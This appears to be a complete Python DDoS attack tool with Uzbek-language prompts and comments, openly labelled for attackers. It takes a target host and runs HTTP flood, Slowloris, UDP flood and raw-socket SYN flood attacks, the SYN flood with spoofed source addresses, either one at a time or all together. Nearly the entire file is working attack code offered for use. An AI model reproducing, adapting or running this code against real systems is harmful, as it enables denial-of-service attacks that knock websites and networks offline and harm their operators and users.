#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import requests
import threading
import subprocess
from datetime import datetime

# Ranglar
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

class DDoSTool:
    def __init__(self):
        self.running = False
        self.target = ""
        self.port = 80
        self.threads = 100
        self.duration = 60
        self.method = ""
        self.stats = {
            'sent': 0,
            'errors': 0,
            'start_time': 0
        }
        
    def clear_screen(self):
        """Ekran tozalash"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_banner(self):
        """Bannerni chiqarish"""
        banner = f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════╗
{RED}║{CYAN}                   DDoS ATTACK TOOL v2.0                    {RED}║
{RED}║{YELLOW}             ⚡ Hujumchi uchun maxsus tayyorlangan ⚡        {RED}║
{RED}╠══════════════════════════════════════════════════════════╣
{RED}║{GREEN}   • HTTP Flood      - Web saytlar uchun                    {RED}║
{RED}║{GREEN}   • Slowloris       - Serverlarni bo'g'ish                 {RED}║
{RED}║{GREEN}   • UDP Flood       - Portlarga hujum                      {RED}║
{RED}║{GREEN}   • SYN Flood       - TCP bog'lamalarni to'ldirish         {RED}║
{RED}╚══════════════════════════════════════════════════════════╝{RESET}
"""
        print(banner)
    
    def print_menu(self):
        """Asosiy menyu"""
        menu = f"""
{YELLOW}[{WHITE}1{YELLOW}] {GREEN}→ HTTP Flood Attack
{YELLOW}[{WHITE}2{YELLOW}] {GREEN}→ Slowloris Attack
{YELLOW}[{WHITE}3{YELLOW}] {GREEN}→ UDP Flood Attack
{YELLOW}[{WHITE}4{YELLOW}] {GREEN}→ SYN Flood Attack (Root)
{YELLOW}[{WHITE}5{YELLOW}] {GREEN}→ Mixed Attack (Hammasi birdan)
{YELLOW}[{WHITE}6{YELLOW}] {GREEN}→ Stop Attack
{YELLOW}[{WHITE}7{YELLOW}] {GREEN}→ Settings
{YELLOW}[{WHITE}8{YELLOW}] {GREEN}→ View Stats
{YELLOW}[{WHITE}9{YELLOW}] {GREEN}→ Exit

{BLUE}┌─[{CYAN}root@ddos{BLUE}]─[{YELLOW}~{BLUE}]
└──╼ {WHITE}$ {RESET}""", end=""
        return input(menu)
    
    def get_target_info(self):
        """Target ma'lumotlarini olish"""
        self.clear_screen()
        self.print_banner()
        
        print(f"{CYAN}[?] Target URL yoki IP kiriting:{RESET}")
        self.target = input(f"{BLUE}└─╼ {WHITE}")
        
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        
        print(f"\n{CYAN}[?] Port (default 80):{RESET}")
        port_input = input(f"{BLUE}└─╼ {WHITE}")
        self.port = int(port_input) if port_input else 80
        
        print(f"\n{CYAN}[?] Threads soni (default 100):{RESET}")
        threads_input = input(f"{BLUE}└─╼ {WHITE}")
        self.threads = int(threads_input) if threads_input else 100
        
        print(f"\n{CYAN}[?] Hujum vaqti (sekund, default 60):{RESET}")
        duration_input = input(f"{BLUE}└─╼ {WHITE}")
        self.duration = int(duration_input) if duration_input else 60
        
        print(f"\n{GREEN}[✓] Ma'lumotlar qabul qilindi!")
        time.sleep(1)
    
    def http_flood(self):
        """HTTP Flood attack"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        while self.running:
            try:
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache',
                    'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                }
                
                response = requests.get(
                    f"{self.target}:{self.port}" if self.port != 80 else self.target,
                    headers=headers,
                    timeout=3
                )
                
                self.stats['sent'] += 1
                
                if self.stats['sent'] % 50 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    print(f"{GREEN}[+] HTTP Flood | Sent: {self.stats['sent']} | Errors: {self.stats['errors']} | Time: {elapsed:.1f}s{RESET}")
                    
            except Exception as e:
                self.stats['errors'] += 1
    
    def slowloris(self):
        """Slowloris attack"""
        sockets = []
        
        # Bog'lamalarni ochish
        while self.running and len(sockets) < self.threads:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                
                target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
                sock.connect((target_ip, self.port))
                
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {target_ip}\r\n".encode())
                sock.send("User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                
                sockets.append(sock)
                
                if len(sockets) % 10 == 0:
                    print(f"{YELLOW}[+] Slowloris | Open connections: {len(sockets)}{RESET}")
                    
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.1)
        
        # Bog'lamalarni ochiq saqlash
        while self.running and sockets:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-Header: {random.randint(1, 5000)}\r\n".encode())
                    self.stats['sent'] += 1
                    time.sleep(10)
                except:
                    sockets.remove(sock)
                    try:
                        sock.close()
                    except:
                        pass
            
            print(f"{CYAN}[+] Slowloris | Active: {len(sockets)} | Total: {self.stats['sent']}{RESET}")
    
    def udp_flood(self):
        """UDP Flood attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)  # 1KB packets
        target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        while self.running:
            try:
                sock.sendto(data, (target_ip, self.port))
                self.stats['sent'] += 1
                
                if self.stats['sent'] % 1000 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    print(f"{PURPLE}[+] UDP Flood | Packets: {self.stats['sent']} | Time: {elapsed:.1f}s{RESET}")
                    
            except Exception as e:
                self.stats['errors'] += 1
    
    def syn_flood(self):
        """SYN Flood attack (root kerak)"""
        if os.geteuid() != 0:
            print(f"{RED}[!] SYN Flood uchun root huquqi kerak!{RESET}")
            print(f"{YELLOW}[!] Iltimos 'sudo' bilan ishga tushiring.{RESET}")
            return
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except:
            print(f"{RED}[!] RAW socket yaratib bo'lmadi!{RESET}")
            return
        
        target_ip = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        while self.running:
            try:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                
                # IP header
                ip_header = self.create_ip_header(src_ip, target_ip)
                
                # TCP header (SYN flag)
                tcp_header = self.create_tcp_header(src_port, self.port)
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
                
                self.stats['sent'] += 1
                
                if self.stats['sent'] % 500 == 0:
                    elapsed = time.time() - self.stats['start_time']
                    print(f"{RED}[+] SYN Flood | Packets: {self.stats['sent']} | Time: {elapsed:.1f}s{RESET}")
                    
            except Exception as e:
                self.stats['errors'] += 1
    
    def create_ip_header(self, src_ip, dst_ip):
        """IP header yaratish"""
        from struct import pack
        
        ip_ver = 4
        ip_ihl = 5
        ip_tos = 0
        ip_tot_len = 40
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        
        ip_saddr = socket.inet_aton(src_ip)
        ip_daddr = socket.inet_aton(dst_ip)
        
        ip_header = pack('!BBHHHBBH4s4s', 
            (ip_ver << 4) + ip_ihl, 
            ip_tos, 
            ip_tot_len,
            ip_id, 
            ip_frag_off, 
            ip_ttl, 
            ip_proto, 
            ip_check,
            ip_saddr, 
            ip_daddr
        )
        
        return ip_header
    
    def create_tcp_header(self, src_port, dst_port):
        """TCP header yaratish"""
        from struct import pack
        
        tcp_seq = random.randint(1, 4294967295)
        tcp_ack_seq = 0
        tcp_doff = 5
        tcp_flags = 2  # SYN
        tcp_window = socket.htons(5840)
        tcp_check = 0
        tcp_urg_ptr = 0
        tcp_offset_res = (tcp_doff << 4) + 0
        
        tcp_header = pack('!HHLLBBHHH',
            src_port, 
            dst_port, 
            tcp_seq, 
            tcp_ack_seq,
            tcp_offset_res, 
            tcp_flags, 
            tcp_window, 
            tcp_check, 
            tcp_urg_ptr
        )
        
        return tcp_header
    
    def mixed_attack(self):
        """Hamma metodlarni birdan ishga tushirish"""
        print(f"{GREEN}[!] Mixed Attack boshlanmoqda...{RESET}")
        
        threads = []
        
        # HTTP Flood
        t1 = threading.Thread(target=self.http_flood)
        t1.daemon = True
        threads.append(t1)
        t1.start()
        
        # Slowloris
        t2 = threading.Thread(target=self.slowloris)
        t2.daemon = True
        threads.append(t2)
        t2.start()
        
        # UDP Flood
        t3 = threading.Thread(target=self.udp_flood)
        t3.daemon = True
        threads.append(t3)
        t3.start()
        
        # SYN Flood (agar root bo'lsa)
        if os.geteuid() == 0:
            t4 = threading.Thread(target=self.syn_flood)
            t4.daemon = True
            threads.append(t4)
            t4.start()
        
        # Attack davomida statistikani chiqarish
        end_time = time.time() + self.duration
        while time.time() < end_time and self.running:
            elapsed = int(time.time() - self.stats['start_time'])
            remaining = int(end_time - time.time())
            
            print(f"{CYAN}[+] Mixed Attack | Elapsed: {elapsed}s | Remaining: {remaining}s | Total: {self.stats['sent']}{RESET}")
            time.sleep(5)
    
    def start_attack(self, method):
        """Hujumni boshlash"""
        self.running = True
        self.stats['sent'] = 0
        self.stats['errors'] = 0
        self.stats['start_time'] = time.time()
        
        print(f"\n{GREEN}[!] Hujum boshlandi!{RESET}")
        print(f"{YELLOW}Target: {self.target}")
        print(f"Port: {self.port}")
        print(f"Method: {method}")
        print(f"Threads: {self.threads}")
        print(f"Duration: {self.duration} sekund{RESET}\n")
        
        attack_thread = threading.Thread(target=method)
        attack_thread.daemon = True
        attack_thread.start()
        
        # Vaqtni hisoblash
        end_time = time.time() + self.duration
        while time.time() < end_time and self.running:
            time.sleep(1)
        
        self.stop_attack()
    
    def stop_attack(self):
        """Hujumni to'xtatish"""
        self.running = False
        elapsed = time.time() - self.stats['start_time']
        
        print(f"\n{RED}[!] Hujum to'xtatildi!{RESET}")
        print(f"{GREEN}Jami so'rovlar: {self.stats['sent']}")
        print(f"Xatoliklar: {self.stats['errors']}")
        print(f"Vaqt: {elapsed:.1f} sekund{RESET}")
        
        input(f"\n{CYAN}Davom etish uchun Enter bosing...{RESET}")
    
    def settings(self):
        """Sozlamalar menyusi"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            print(f"{BOLD}{CYAN}⚙️  SOZLAMALAR{RESET}\n")
            print(f"{WHITE}1. Threads soni: {GREEN}{self.threads}")
            print(f"{WHITE}2. Default port: {GREEN}{self.port}")
            print(f"{WHITE}3. Default duration: {GREEN}{self.duration}")
            print(f"{WHITE}4. Back to main menu{RESET}\n")
            
            choice = input(f"{BLUE}┌─[{CYAN}settings{BLUE}]─[{YELLOW}~{BLUE}]\n└──╼ {WHITE}")
            
            if choice == '1':
                print(f"\n{CYAN}Threads soni: {RESET}", end="")
                self.threads = int(input())
            elif choice == '2':
                print(f"\n{CYAN}Port: {RESET}", end="")
                self.port = int(input())
            elif choice == '3':
                print(f"\n{CYAN}Duration: {RESET}", end="")
                self.duration = int(input())
            elif choice == '4':
                break
    
    def view_stats(self):
        """Statistikani ko'rish"""
        self.clear_screen()
        self.print_banner()
        
        print(f"{BOLD}{CYAN}📊 STATISTIKA{RESET}\n")
        
        if self.stats['start_time'] > 0:
            elapsed = time.time() - self.stats['start_time']
            rate = self.stats['sent'] / elapsed if elapsed > 0 else 0
            
            print(f"{WHITE}Jami so'rovlar: {GREEN}{self.stats['sent']}")
            print(f"{WHITE}Xatoliklar: {RED}{self.stats['errors']}")
            print(f"{WHITE}Vaqt: {YELLOW}{elapsed:.1f} sekund")
            print(f"{WHITE}Tezlik: {CYAN}{rate:.1f} so'rov/sekund")
        else:
            print(f"{YELLOW}Hali hech qanday hujum boshlanmagan.{RESET}")
        
        input(f"\n{CYAN}Davom etish uchun Enter bosing...{RESET}")
    
    def run(self):
        """Asosiy loop"""
        while True:
            self.clear_screen()
            self.print_banner()
            
            choice = self.print_menu()
            
            if choice == '1':
                self.get_target_info()
                self.start_attack(self.http_flood)
            
            elif choice == '2':
                self.get_target_info()
                self.start_attack(self.slowloris)
            
            elif choice == '3':
                self.get_target_info()
                self.start_attack(self.udp_flood)
            
            elif choice == '4':
                if os.geteuid() != 0:
                    print(f"\n{RED}[!] SYN Flood uchun root huquqi kerak!{RESET}")
                    print(f"{YELLOW}[!] 'sudo python3 ddos_tool.py' bilan ishga tushiring.{RESET}")
                    time.sleep(2)
                else:
                    self.get_target_info()
                    self.start_attack(self.syn_flood)
            
            elif choice == '5':
                self.get_target_info()
                self.start_attack(self.mixed_attack)
            
            elif choice == '6':
                if self.running:
                    self.stop_attack()
                else:
                    print(f"\n{YELLOW}[!] Hech qanday faol hujum yo'q.{RESET}")
                    time.sleep(1)
            
            elif choice == '7':
                self.settings()
            
            elif choice == '8':
                self.view_stats()
            
            elif choice == '9':
                print(f"\n{GREEN}Tool dan foydalanganingiz uchun rahmat!{RESET}")
                sys.exit(0)

if __name__ == "__main__":
    try:
        tool = DDoSTool()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n\n{YELLOW}Tool to'xtatildi.{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}Xatolik: {e}{RESET}")
        sys.exit(1)
